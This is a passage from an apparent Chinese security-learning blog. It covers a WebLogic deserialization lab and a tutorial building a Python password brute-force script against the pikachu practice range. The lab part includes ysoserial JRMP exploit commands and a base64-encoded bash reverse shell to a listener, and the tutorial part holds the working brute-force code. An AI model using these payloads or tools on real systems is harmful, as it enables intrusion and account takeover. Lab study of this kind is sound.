src="/../image/image-20240718234851924.png" alt="image-20240718234851924"></p><p>替换payload</p><p><img src="/../image/image-20240718234930633.png" alt="image-20240718234930633"></p><p><img src="/../image/image-20240718234944773.png" alt="image-20240718234944773"></p><p>半天没弹回来，保留一下，用别的方法测测</p><p>在攻击机设置好JRM服务,这里执行touch命令时，注意路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections3 &quot;touch /mytest.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240719000106128.png" alt="image-20240719000106128"></p><p>打开weblogictool，如图设置好参数</p><p><img src="/../image/image-20240719000143387.png" alt="image-20240719000143387"></p><p>执行后，在docker容器里查看,yml文件在哪就在哪执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose exec weblogic /bin/bash</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240719000226949.png" alt="image-20240719000226949"></p><p>成功执行，那回到第一种方法，利用payload，重新走一遍</p><p>开启JMRP Server服务：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections3 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xNjA6OTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMzcvOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240719090315802.png" alt="image-20240719090315802"></p><p>更新payload,windows下没有环境，在linux中执行,前面好像执行错了，这里客户端的ip是靶机的ip</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo java -jar ysoserial-all.jar JRMPClient 192.168.174.137:7777 | xxd -p | tr -d $&#x27;\n&#x27; &amp;&amp; echo</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240719091031289.png" alt="image-20240719091031289"></p><p>更换payload</p><p><img src="/../image/image-20240719090714180.png" alt="image-20240719090714180"></p><p><img src="/../image/image-20240719091109057.png" alt="image-20240719091109057"></p><p>使用 nc 进行监听本地的9999端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 9999</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240719091155144.png" alt="image-20240719091155144"></p><p>执行poc还是不行，但后面在在kali测试好像就行了，python脚本执行完要过一会才有反弹回来。。</p><p><img src="/../image/image-20240719101534297.png" alt="image-20240719101534297"></p><p><img src="/../image/image-20240719101931805.png" alt="image-20240719101931805"></p><p>前面也弹回来了，是我没注意。。。</p><p><img src="/../image/image-20240719102247152.png" alt="image-20240719102247152"></p>]]></content>
      
      
      
        <tags>
            
            <tag> weblogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简易爆破poc</title>
      <link href="/2024/07/21/%E7%AE%80%E6%98%93%E7%88%86%E7%A0%B4poc/"/>
      <url>/2024/07/21/%E7%AE%80%E6%98%93%E7%88%86%E7%A0%B4poc/</url>
      
        <content type="html"><![CDATA[<h1 id="POC学习"><a href="#POC学习" class="headerlink" title="POC学习"></a>POC学习</h1><p>​POC测试，即Proof of Concept，是业界流行的针对客户具体应用的验证性测试，根据用户对采用系统提出的性能要求和扩展需求的指标，在选用服务器上进行真实数据的运行，对承载用户数据量和运行时间进行实际测算，并根据用户未来业务扩展的需求加大数据量以验证系统和平台的承载能力和性能变化。<br>​今天，王哥演示了一下一个爆破脚本编写，也就是写了个poc来验证是复测弱口令漏洞</p><p>​这里对上课学的东西做一下复盘，写一个结合自己理解的POC，可以参考很多例子，但还是写一个自己思路的把</p><p><a href="https://cloud.tencent.com/developer/article/1759225">https://cloud.tencent.com/developer/article/1759225</a></p><h2 id="基于pikachu弱口令爆破的脚本"><a href="#基于pikachu弱口令爆破的脚本" class="headerlink" title="基于pikachu弱口令爆破的脚本"></a>基于pikachu弱口令爆破的脚本</h2><p>​在用xray扫pikachu靶场时，我们会遇到暴力破解的漏洞，这时候我们可以写一个简单的爆破脚本来测试，虽然burp很好用，但写一个poc练习一下也挺好的，写一下需求思维导图，流程图</p><p>​爆破，顾名思义，简单粗暴，对账号，密码用字典一个一个匹配测试，思路比较简单，但实际情况很复杂，有验证码，流量限制等。我们需要考虑这些问题。下面给出一个需求的思维导图。</p><p><img src="/../image/image-20240719211510589.png" alt="image-20240719211510589"></p><p>需求要点多，一步一步来吧，像上课一样，先获取页面，传参，交互，慢慢添加功能，再画一个功能的流程图</p><p>![一个爆破账号密码的python工具流程图 (1)](C:\Users\yxz\Downloads\一个爆破账号密码的python工具流程图 (1).png)</p><p>上面是ai生成的，好细致，还学了两个点，输出日志和结果，这是我没考虑到的。下面先针对pikachu的爆破页面进行编写</p><h2 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h2><p>操作系统：windows10</p><p>运行环境：python 3.9.12，pycharm</p><p>主要依赖：在requirement.txt里</p><h2 id="访问页面"><a href="#访问页面" class="headerlink" title="访问页面"></a>访问页面</h2><p>先具体看下页面内容，爬虫后续再实现</p><p><img src="/../image/image-20240720095556210.png" alt="image-20240720095556210"></p><p>查看源码</p><p><img src="/../image/image-20240720095708441.png" alt="image-20240720095708441"></p><p>post方法，这样子参数不好确定，抓包看看</p><p><img src="/../image/image-20240720095839240.png" alt="image-20240720095839240"></p><p>可以，确定参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=admin&amp;submit=Login</span><br></pre></td></tr></table></figure><h2 id="获取页面"><a href="#获取页面" class="headerlink" title="获取页面"></a>获取页面</h2><p>这个可以用requests模块，不会用就搜怎么用</p><p><a href="https://blog.csdn.net/m0_43404934/article/details/122331463">https://blog.csdn.net/m0_43404934/article/details/122331463</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;</span></span><br><span class="line">r = requests.post(url)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240720103304336.png" alt="image-20240720103304336"></p><h2 id="传递参数"><a href="#传递参数" class="headerlink" title="传递参数"></a>传递参数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=admin&amp;submit=Login</span><br></pre></td></tr></table></figure><p>传递参数，requests要求参数要写成key-value的格式，也可以是json的格式，这里我们用字典的形式传参，这里先写个正确的密码，看返回内容会不会改变</p><p>传回来的内容，有点难看，看下给它保存成html文件试试</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span> ( <span class="string">r&#x27;HTML.html&#x27;</span>, <span class="string">&#x27;w+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(r.text)</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240720104937870.png" alt="image-20240720104937870"></p><p>返回成功的标志是success</p><h2 id="判断是否成功"><a href="#判断是否成功" class="headerlink" title="判断是否成功"></a>判断是否成功</h2><p>可以先用简单if in来试试，简单修改下代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/ python3</span></span><br><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">username=<span class="string">&quot;admin&quot;</span></span><br><span class="line">password=<span class="string">&quot;123456&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:username,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:password,</span><br><span class="line">    <span class="string">&quot;submit&quot;</span>:<span class="string">&quot;Login&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;</span></span><br><span class="line">r = requests.post(url,data=data)</span><br><span class="line"><span class="comment">#print(type(r))</span></span><br><span class="line"><span class="comment"># with open ( r&#x27;HTML.html&#x27;, &#x27;w+&#x27;) as f:</span></span><br><span class="line"><span class="comment">#     f.write(r.text)</span></span><br><span class="line"><span class="comment">#print(r.text)</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+]爆破成功：用户名：&quot;</span> + username + <span class="string">&quot;，密码：&quot;</span> + password)</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240720105304209.png" alt="image-20240720105304209"></p><h2 id="结合字典"><a href="#结合字典" class="headerlink" title="结合字典"></a>结合字典</h2><p><img src="/../image/image-20240720105405572.png" alt="image-20240720105405572"></p><p>username.txt（pikachu打错了）</p><p><img src="/../image/image-20240720105444526.png" alt="image-20240720105444526"></p><p>password.txt</p><p><img src="/../image/image-20240720160206509.png" alt="image-20240720160206509"></p><p>读取字典，存为列表</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;username.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">    username = f1.read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f2:</span><br><span class="line">    password = f2.read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(username)</span><br><span class="line"><span class="comment"># print(password[1])</span></span><br><span class="line"><span class="built_in">print</span>(password)</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240720163133423.png" alt="image-20240720163133423"></p><h2 id="执行爆破run"><a href="#执行爆破run" class="headerlink" title="执行爆破run"></a>执行爆破run</h2><p>我们可以把爆破过程封装成一个函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">username,pssword,url</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> username:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> password:</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: i,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: j,</span><br><span class="line">                <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Login&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url, data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+]爆破成功：用户名：&quot;</span> + i + <span class="string">&quot;，密码：&quot;</span> + j)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-]爆破失败：用户名：&quot;</span> + i + <span class="string">&quot;，密码：&quot;</span> + j)</span><br></pre></td></tr></table></figure><p>然后执行run函数</p><p><img src="/../image/image-20240720163820838.png" alt="image-20240720163820838"></p><p>如果我们只想看成功例子，可以把else注释了</p><p><img src="/../image/image-20240720164108876.png" alt="image-20240720164108876"></p><p>到这里就基本实现了一个爆破的poc了，下面我们可以继续扩展</p><p>高级：<a href="https://www.cnblogs.com/JIAcheerful/p/18226320">https://www.cnblogs.com/JIAcheerful/p/18226320</a></p><h2 id="扩展一：用参数指定两个字典"><a href="#扩展一：用参数指定两个字典" class="headerlink" title="扩展一：用参数指定两个字典"></a>扩展一：用参数指定两个字典</h2><p><a href="https://blog.csdn.net/MengYa_Dream/article/details/124451852">https://blog.csdn.net/MengYa_Dream/article/details/124451852</a></p><p>这里就要用到我们的parser库了，在学习过程 中，发现argparser更好用,下面这个是官中文档，有例子，容易理解</p><p><a href="https://docs.python.org/zh-cn/3/library/argparse.html">https://docs.python.org/zh-cn/3/library/argparse.html</a></p><p>使用 <a href="https://docs.python.org/zh-cn/3/library/argparse.html#module-argparse"><code>argparse</code></a> 的第一步是创建一个 <a href="https://docs.python.org/zh-cn/3/library/argparse.html#argparse.ArgumentParser"><code>ArgumentParser</code></a> 对象：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparser <span class="comment">#导入argparser模块</span></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;参数功能&#x27;</span>)</span><br></pre></td></tr></table></figure><p><a href="https://docs.python.org/zh-cn/3/library/argparse.html#argparse.ArgumentParser"><code>ArgumentParser</code></a> 对象包含将命令行解析成 Python 数据类型所需的全部信息。</p><h3 id="添加参数"><a href="#添加参数" class="headerlink" title="添加参数"></a>添加参数</h3><p><a href="https://blog.csdn.net/MilkLeong/article/details/115639740">https://blog.csdn.net/MilkLeong/article/details/115639740</a></p><p>给一个 <a href="https://docs.python.org/zh-cn/3/library/argparse.html#argparse.ArgumentParser"><code>ArgumentParser</code></a> 添加程序参数信息是通过调用 <a href="https://docs.python.org/zh-cn/3/library/argparse.html#argparse.ArgumentParser.add_argument"><code>add_argument()</code></a> 方法完成的。通常，这些调用指定 <a href="https://docs.python.org/zh-cn/3/library/argparse.html#argparse.ArgumentParser"><code>ArgumentParser</code></a> 如何获取命令行字符串并将其转换为对象。这些信息在 <a href="https://docs.python.org/zh-cn/3/library/argparse.html#argparse.ArgumentParser.parse_args"><code>parse_args()</code></a> 调用时被存储和使用。例如：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--username&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定用户字典&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--password&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定密码字典&quot;</span>)</span><br></pre></td></tr></table></figure><p>完成代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse <span class="comment">#导入模块</span></span><br><span class="line"><span class="comment">#获取字典数据存为列表</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;参数功能&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--username&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定用户字典&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--password&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定密码字典&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">username = get_data(args.username)</span><br><span class="line">password = get_data(args.password)</span><br><span class="line"><span class="built_in">print</span>(username)</span><br><span class="line"><span class="built_in">print</span>(password)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果是pycharm可以在Terminal里测试</p><p><img src="/../image/image-20240720171822365.png" alt="image-20240720171822365"></p><p>这里为了方便演示，我就在外面的cmd里演示了</p><p><img src="/../image/image-20240720185111324.png" alt="image-20240720185111324"></p><p><img src="/../image/image-20240720185127470.png" alt="image-20240720185127470"></p><p>可以，这时候我们就可以去改我们的poc了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/ python3</span></span><br><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="comment">#文件读取</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;参数功能&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--username&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定用户字典&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--password&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定密码字典&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">username = get_data(args.username)</span><br><span class="line">password = get_data(args.password)</span><br><span class="line"><span class="comment">#print(username)</span></span><br><span class="line"><span class="comment">#print(password)</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">username,pssword,url</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> username:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> password:</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: i,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: j,</span><br><span class="line">                <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Login&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url, data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+]爆破成功：用户名：&quot;</span> + i + <span class="string">&quot;，密码：&quot;</span> + j)</span><br><span class="line">            <span class="comment"># else:</span></span><br><span class="line">            <span class="comment">#     print(&quot;[-]爆破失败：用户名：&quot; + i + &quot;，密码：&quot; + j)</span></span><br><span class="line">run(username,password,url)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240720193949945.png" alt="image-20240720193949945"></p><p>成功执行，然后在写这个功能的时候遇到个问题，就是虚拟机挂起了，服务没了，这时候未响应，也没有输出，我们可以做个探活，然后可以看下这篇文章，后续有用</p><p><a href="https://blog.csdn.net/heqiang525/article/details/89879056">https://blog.csdn.net/heqiang525/article/details/89879056</a></p><h2 id="扩展二：探测服务存活"><a href="#扩展二：探测服务存活" class="headerlink" title="扩展二：探测服务存活"></a>扩展二：探测服务存活</h2><p><a href="https://blog.csdn.net/CNXBDSa/article/details/120055796">https://blog.csdn.net/CNXBDSa/article/details/120055796</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    respone = requests.get(url, timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;响应状态码：<span class="subst">&#123;respone.status_code&#125;</span> -----&gt; <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;请求失败: <span class="subst">&#123;url&#125;</span>, 错误信息: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>原理就是根据响应码来判断，我们先看看服务存活的结果</p><p><img src="/../image/image-20240720200228410.png" alt="image-20240720200228410"></p><p>可以看到是存活的，下面我们把服务关闭试试</p><p><img src="/../image/image-20240720200308097.png" alt="image-20240720200308097"></p><p><img src="/../image/image-20240720200400844.png" alt="image-20240720200400844"></p><p>可以看到返回失败的信息了，当然如果网络状态不好的状况下，我们可以适当提高timeout的时间，我们可以把timeout作为可控参数传递，然后设置好默认的值为5</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--timeout&#x27;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, metavar=<span class="string">&quot;5&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;设置超时时间&quot;</span>, default=<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>然后报错信息有时候太多影响体验可以看下这篇</p><p><a href="https://geek-docs.com/python/python-ask-answer/620_python_getting_exception_details_in_python.html#:~:text=%E5%BD%93Python%E8%A7%A3%E9%87%8A%E5%99%A8%E9%81%87%E5%88%B0%E9%94%99%E8%AF%AF%E6%97%B6%EF%BC%8C%E4%BC%9A%E5%BC%95%E5%8F%91%E4%B8%80%E4%B8%AA%E5%BC%82%E5%B8%B8%E5%AF%B9%E8%B1%A1%E3%80%82,%E8%BF%99%E4%B8%AA%E5%BC%82%E5%B8%B8%E5%AF%B9%E8%B1%A1%E5%8C%85%E5%90%AB%E4%BA%86%E5%87%BA%E9%94%99%E7%9A%84%E5%8E%9F%E5%9B%A0%E5%92%8C%E4%BD%8D%E7%BD%AE%EF%BC%8C%E4%BB%A5%E5%8F%8A%E4%B8%80%E4%BA%9B%E5%85%B6%E4%BB%96%E7%9A%84%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E3%80%82%20%E9%80%9A%E8%BF%87%E6%8D%95%E8%8E%B7%E5%92%8C%E5%A4%84%E7%90%86%E5%BC%82%E5%B8%B8%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E8%AE%A9%E7%A8%8B%E5%BA%8F%E5%9C%A8%E5%87%BA%E7%8E%B0%E9%94%99%E8%AF%AF%E6%97%B6%E4%B8%8D%E4%B8%AD%E6%96%AD%E8%BF%90%E8%A1%8C%EF%BC%8C%E8%80%8C%E6%98%AF%E6%8F%90%E4%BE%9B%E4%B8%80%E4%BA%9B%E9%94%99%E8%AF%AF%E6%8F%90%E7%A4%BA%E6%88%96%E8%BF%9B%E8%A1%8C%E7%9B%B8%E5%BA%94%E7%9A%84%E5%A4%84%E7%90%86%E3%80%82">Python 获取Python中的异常详细信息</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">url, timeout</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        respone = requests.get(url, timeout=timeout)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;响应状态码：<span class="subst">&#123;respone.status_code&#125;</span> -----&gt; <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> respone.status_code</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;请求失败: <span class="subst">&#123;url&#125;</span>, 错误信息: <span class="subst">&#123;<span class="built_in">type</span>(e).__name__&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br></pre></td></tr></table></figure><p>这样子报错信息会少很多</p><p><img src="/../image/image-20240720201506459.png" alt="image-20240720201506459"></p><p>也可以测试timeout参数有没有生效，不懂有没有上限，我们设置个10s，在10s内我们把服务重新启动起来看看，我这样子设计不合理，连接是一次请求，一次返回。如果没有明确返回，才会探测，如果直接拒绝连接，导致失败，它都不会等，所以这个实验不靠谱，要限制流量测试才合理，但这个有点难度。。。暂时不测了，先放那。</p><h2 id="扩展三：提升速度"><a href="#扩展三：提升速度" class="headerlink" title="扩展三：提升速度"></a>扩展三：提升速度</h2><p><a href="https://www.bilibili.com/video/BV1bK411A7tV/?spm_id_from=333.337.search-card.all.click&vd_source=3ae03810e5d4ba6e6b93c5edd6c76912">Python 并发编程实战，用多线程、多进程、多协程加速程序运行</a></p><p><a href="https://blog.csdn.net/weixin_52906070/article/details/132317118">python并发编程这一篇就够了</a></p><p>多线程:threading，利用CPU和IO可以同时执行的原理，让CPU不会干巴巴等待IO完成</p><p>多进程:multiprocessing，利用多核CPU的能力，真正的并行执行任务</p><p>asyncio,异步IO:在单线程利用CPU和IO同时执行的原理，实现函数异步执行</p><p>使用Lock对资源加锁，防止冲突访问</p><p>使用Queue实现不同线程&#x2F;进程之间的数据通信，实现生产者-消费者模式</p><p>操作系统的超级难点。。。。</p><p>使用线程池Pool&#x2F;进程池Po0l，简化线程&#x2F;进程的任务提交、等待结束、获取结果</p><p>使用subprocess启动外部程序的进程，并进行输入输出交互</p><p><img src="/../image/image-20240720203118431.png" alt="image-20240720203118431"></p><p>怎么感觉爆破，两个都沾点，但应该是IO密集型，网络开销比较大</p><p><img src="/../image/image-20240720203257214.png" alt="image-20240720203257214"></p><p><img src="/../image/image-20240720203336198.png" alt="image-20240720203336198"></p><p>选择多线程</p><p><img src="/../image/image-20240720203524130.png" alt="image-20240720203524130"></p><p>后面的生产者消费者就不看了，太难了，下面是两种代码</p><p>原版</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/ python3</span></span><br><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># 文件读取</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;参数功能&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--username&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定用户字典&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--password&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定密码字典&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--timeout&#x27;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, metavar=<span class="string">&quot;5&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;设置超时时间&quot;</span>, default=<span class="number">5</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">username = get_data(args.username)</span><br><span class="line">password = get_data(args.password)</span><br><span class="line">timeout = args.timeout</span><br><span class="line"><span class="comment"># print(username)</span></span><br><span class="line"><span class="comment"># print(password)</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 探活</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">url, timeout</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        respone = requests.get(url, timeout=timeout)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;响应状态码：<span class="subst">&#123;respone.status_code&#125;</span> -----&gt; <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> respone.status_code</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;请求失败: <span class="subst">&#123;url&#125;</span>, 错误信息: <span class="subst">&#123;<span class="built_in">type</span>(e).__name__&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span 